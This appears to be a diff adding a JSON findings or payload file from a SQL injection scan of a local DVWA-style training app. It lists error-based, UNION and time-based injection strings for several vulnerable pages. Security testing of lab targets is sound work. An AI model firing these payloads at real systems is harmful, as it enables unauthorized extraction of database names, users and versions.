@@ -1,0 +1,127 @@
+[
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e))--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e))--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' UNION SELECT NULL, NULL, CONCAT(0x7e, user(), 0x7e, database(), 0x7e))--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' UNION SELECT NULL, NULL, CONCAT(0x7e, user(), 0x7e, database(), 0x7e))--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND 1=1--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND 1=1--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND SLEEP(5)--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND SLEEP(5)--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND updatexml(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1)--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/brute/",
+        "payload": "' AND updatexml(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1)--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/exec/",
+        "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT DATABASE()),0x7e))--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/exec/",
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/exec/",
+        "payload": "' AND 1=1--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/exec/",
+        "payload": "' AND SLEEP(5)--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/exec/",
+        "payload": "' AND BENCHMARK(10000000,MD5('test'))--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' OR updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' OR updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' UNION SELECT NULL, NULL, NULL--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' UNION SELECT NULL, NULL, NULL--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' AND 1=1--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' AND 1=1--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' OR SLEEP(5)--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' OR SLEEP(5)--",
+        "type": "Content-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' UNION SELECT NULL, version(), NULL--",
+        "type": "Error-based SQLi"
+    },
+    {
+        "page": "http://localhost/vulnerabilities/sqli/",
+        "payload": "' UNION SELECT NULL, version(), NULL--",
+        "type": "Content-based SQLi"
+    }
+]
